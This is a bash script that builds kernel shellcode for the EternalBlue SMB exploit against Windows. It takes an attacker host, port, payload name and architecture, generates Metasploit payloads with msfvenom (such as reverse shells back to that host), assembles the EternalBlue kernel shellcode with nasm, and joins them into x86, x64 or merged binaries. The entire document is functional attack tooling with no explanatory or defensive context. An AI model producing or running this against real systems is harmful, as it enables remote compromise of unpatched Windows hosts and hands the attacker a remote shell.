#!/bin/bash
while getopts ":h:p:s:a:" opt; do
	case $opt in
		h)
			lhost=$OPTARG
		;;
		p)
			lport=$OPTARG
		;;
		s)
			paylo=$OPTARG
		;;
		a)
			arch=$OPTARG
		;;
	esac
done
path=`pwd`
if [ "$arch" = "auto" ]; then
	x86_msf_shellcode=$PWD"/sc_x86_msf.bin"
	x64_msf_shellcode=$PWD"/sc_x64_msf.bin"
	x86_shellcode=$PWD"/sc_x86.bin"
	x64_shellcode=$PWD"/sc_x64.bin"
	all_shellcode=$PWD"/sc_all.bin"
	mergeScript=$PWD"/merge_shellcode.py"
	rawAssembly_x64=$PWD"/assembly/eternalblue_kshellcode_x64"
	rawAssembly_x86=$PWD"/assembly/eternalblue_kshellcode_x86"
	rm $rawAssembly_x64 $rawAssembly_x86 2>/dev/null
	payload_OS=`echo $paylo| cut -d'/' -f1` > /dev/null 2>&1
	value_registers=`echo $paylo | cut -d'/' -f2` > /dev/null 2>&1
	if [[ "$value_registers" = "x86" ]] || [[ "$value_registers" = "x64" ]]; then
		payload_registers=$value_registers
		payload_format=`echo $paylo | cut -d'/' -f3` > /dev/null 2>&1
		payload_name=`echo $paylo | cut -d'/' -f4` > /dev/null 2>&1
	else
		payload_registers="x86"
		payload_format=`echo $paylo | cut -d'/' -f2` > /dev/null 2>&1
		payload_name=`echo $paylo | cut -d'/' -f3` > /dev/null 2>&1
	fi
	msfvenom -p $payload_OS/x64/$payload_format/$payload_name LHOST=$lhost LPORT=$lport --platform windows -a x64 --format raw -o $x64_msf_shellcode 2>/dev/null
	msfvenom -p $payload_OS/x86/$payload_format/$payload_name LHOST=$lhost LPORT=$lport --platform windows -a x86 --format raw -o $x86_msf_shellcode 2>/dev/null
	nasm -f bin $rawAssembly_x64.asm
	nasm -f bin $rawAssembly_x86.asm
	cat $rawAssembly_x86 $x86_msf_shellcode > $x86_shellcode
	cat $rawAssembly_x64 $x64_msf_shellcode > $x64_shellcode
	python $mergeScript $x86_shellcode $x64_shellcode $all_shellcode
else
	msf_shellcode=$path"/sc_msf.bin"
	shellcode=$path"/sc.bin"
	rawAssembly=$path"/assembly/eternalblue_kshellcode_$arch"
	rm $rawAssembly 2>/dev/null
	msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -a $arch --format raw -o $msf_shellcode 2>/dev/null
	nasm -f bin $rawAssembly.asm
	cat $rawAssembly $msf_shellcode > $shellcode
fi
